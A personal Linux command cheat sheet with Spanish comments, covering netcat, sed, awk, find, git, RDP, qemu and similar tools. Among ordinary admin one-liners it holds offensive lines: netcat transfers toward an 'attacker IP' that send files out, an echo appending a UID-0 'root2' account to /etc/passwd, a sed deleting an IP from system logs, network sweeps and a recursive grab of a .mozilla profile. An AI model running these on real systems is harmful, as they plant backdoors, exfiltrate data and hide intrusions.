# netcat file transfer
a> nc -lnvp 444 < chisel
v> cat > chisel < nc /dev/tcp/ip_atacante/444

v> nc -l 4444 > file
a> nc 10.10.1.23 4444 < file

v> cat file | nc 10.6.4.61 9001
a> nc -lnvp 9001 > file

# nc port-scanner
nc -zv 172.17.0.1 1-1000

# cp
cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $!
cp /etc/apache2/sites-available/self-service-password.conf{,.bak} # crea archivo de backup

# openssl
openssl s_client – connect sitio:443
openssl s_client -connect sitio:443 -brief
openssl s_client -connect sitio:443 2> /dev/null | openssl x509 -noout -dates

# cat
cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
cat /etc/passwd | awk 'NR==17'
cat file.json | jq '. | map_values(keys)'

# find
find . -type f -name '*2022*' -delete # elimina archivos con 2022 en el nombre
find /home/linux -mtime 0 --> ultimos archivos modificados
find . -type f -printf "%T+ %p\n" | sort # ordena archivos y muestra una columna con timestamps
find / -type f -regexp ".*\(png\|jpg\)$" 2>/dev/null # multiples extensiones
find thm/ -type f -iname 'notas'| xargs -i scp -o 'ProxyJump pgraffigna@192.168.122.1' '{}' quentin@192.168.0.20:
find . ! -name 'notas.txt' -type f -exec rm -f {} +

# generador de passwords
head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' 
{ shuf -rn 8 -e {A..Z} {a..z}; shuf -rn 2 -e {0..9}; }| shuf | tr -d $'\n'; echo
pwgen -1 -c 9 -n 4 -s | while IFS= read -r i; do printf '%s\n' "$i"1; done

# sed
sed -i '/192\.168\.0\.1/d' /var/log/messages.log # elimina todas las lineas que contienen la ip
sed 's/ //g' hash.txt # elimina todas las lineas en blanco
sed '/^[[:space:]]*$/d' # elimina los espacios 
sed 's/\\n/\n/g' # reemplazar \n a salto de linea
:%g/^[ \t]*#/d -- elimina todos los comentarios

# awk
awk '{print "https://"$1}'
awk '{print $1 ":" $2}'
awk '{print $1}' FS=':' # FS=delimitador
awk '/<pre>/,/<\/pre>/{print}' archivo.html
awk '/start_pattern/,/stop_pattern/' file.txt # Display a block of text with AWK

# echo
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd # crear un usuario 'root2' con el PASSWORD creado
echo "testing%3Fcmd%3Dwhoami" | php -R 'echo urldecode($argn);'

# grep
grep -oP '\[.*?\]' # quita los corchetes
grep -a '[0-9][0-9]:[0-9][0-9]:[0-9][0-9]' /var/log/apache2/access.log # formato: HH:MM:SS
grep -oP '".*?"' bytearray.txt # filtra todo lo que esta entre comillas
grep '^mo' /usr/share/seclists/Discovery/Web-Content/common.txt | grep -x '.\{7,7\}' # busca palabras de 7 letras

# One-liners
for i in {1..20}; do curl http://ip/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done # enum de usuarios
for i in {1..10}; do timeout 1 bash -c "ping 192.168.0.$i"; done | grep '64' | awk '{print $4}' | tr -d ':' # ping sweep
for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done # port knocker
for num in {1..10}; do sudo arping -c 1 192.168.0.$num | grep '60' | awk '{print $4 "\t" $5}' | sed 's/(/ /;s/)/ /;s/.$//'; done # mac sweep
for i in $(seq 21 100); do nc -vz 192.168.0.208 $i;done
[ -d "${DIR}" ] || mkdir -p "${DIR}" # crear una carpeta sino existe
while read -r line; do echo $line:$(cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '') ; done < usuarios.txt >> password.txt --> creando listado de usuarios + passwords

# manipulación de archivos/carpetas
touch {/folder1/,./}file.{exe,dll,txt} # crea multiples archivos
curl -# --upload-file -F file=@FILE URL
dd if=FILE bs=1 skip=8 of=FILE.out # saca los primeros 8 bytes y deja el resto
dd if=FILE bs=1 count=8 of=FILE.out # solo deja los primeros 8 bytes
smbclient -L \\noc-samba-01.noc -N --option='client min protocol=NT1'
smbget -R smb://ip/carpeta -U USER
du -h --max-depth=1 2> /dev/null | sort -hr | tail -n +2 | head

# cups
ssh admin@10.36.8.43 -T -L 3631:localhost:631 # portforwarding
cupsctl --remote-admin --remote-any --share-printers # activa la administración remota	
/usr/sbin/lpadmin -p imp_sistemas_testing -E -v socket://alv2-sist-print:9100 -P OKI_MPS5502mb.ppd

# qemu
sudo apt install -y spice-vdagent && spice-vdagent # spice qemu copy-paste (aplicar en la VM)
remote-viewer spice://localhost:5900 -f & disown
virt-viewer --connect qemu:///system -f --wait kali-linux &>/dev/null & disown # levanta el proceso + oculta el output + disocia el proceso de la terminal
burpsuite &> /dev/null & disown

# wget
wget -q -r --no-parent http://10.10.150.153:9000/.mozilla/  # descarga recursiva
wget  -q --show-progress --progress=bar:force 2>&1 # muestra solo la barra de progreso
wget -m ftp://10.10.10.10

# varios
tar -xf archive.tar.gz -C /home/linuxize/files # extraer archivos en carpeta
console.table($$('a'),['href']) # todos los links de una web
apt list --installed > instalados.txt
diff old.txt new.txt | grep ">"|cut -c 3- > diff.txt
apt-get install git htop -qq > /dev/null # muestra solo los errores
kill % # borra todos los trabajos
read -t 10 -n 5 -s -p "No podes poner mas de 5 caracteres" # n=caracteres, s=silent(oculta el texto), p=prompt, 10 segundos antes de timeout
setxkbmap -layout es # cambiar distribución de teclado
dpkg-reconfigure locales # cambiar idioma del sistema
jq '.listTemplateResponse[] | {name} | join(" ")' # extrae los nombres de VMs
df -h --output=pcent /home/pgraffigna/datos/
df -h --output=avail /home/pgraffigna/datos/

# rdp
xfreerdp /v:10.10.239.237 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:/tmp,share /size:1366x768 /f
rdp_check.py USUARIO:PASSWORD@10.21.17.107

# caracteres especiales que necesitan ser escapados con \
# ! " # $ & ' ( ) * , : ; < = > ? @ [ \ ] ^ ` { | }

# agregar multiples lineas a archivo
cat <<EOF >> /tmp/file.txt
linea 1
linea 2
EOF

# agregar multiples lineas a archivo con SUDO
sudo tee -a /tmp/file.txt > /dev/null <<EOT
linea 1
linea 2
EOT

# multiline comment
:<<'END_COMMENT'
comment1
comment2 
comment3
END_COMMENT

# git initial config
git config --global user.name "John Doe"
git config --global user.email johndoe@example.com
git remote set-url origin git@github.com:username/repo.git # configurar el repo para ssh

# git enumeration
git log -p # dentro de la carpeta .git
git reset --hard # para recomponer un git repo

# git repo cli
echo "# Dashboard-homer" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/PUTINVLADIMI/Dashboard-homer.git
git push -u origin main

# login modo texto
editar /etc/default/grub:
comentar linea 'quietsplash'
agregar 'text' a linea grub_cmdline
agregar 'console' a linea grub_terminal
sudo update-grub && sudo systemctl set-default multi_user.target

# python env 
sudo apt update && sudo apt install python3-venv
python3 -m venv poc-venv
source poc-venv/bin/activate
deactivate

# dislocker (para montar sistema de archivos bitlocker)
mkdir -p /media/{bitlocker,bitlockermount}
dislocker /dev/sda3 -usistemas -p /media/bitlocker # desencripta la partición  
sudo mount -t ntfs-3g -o loop /media/bitlocker/dislocker-file /media/bitlockermount # monta la partición
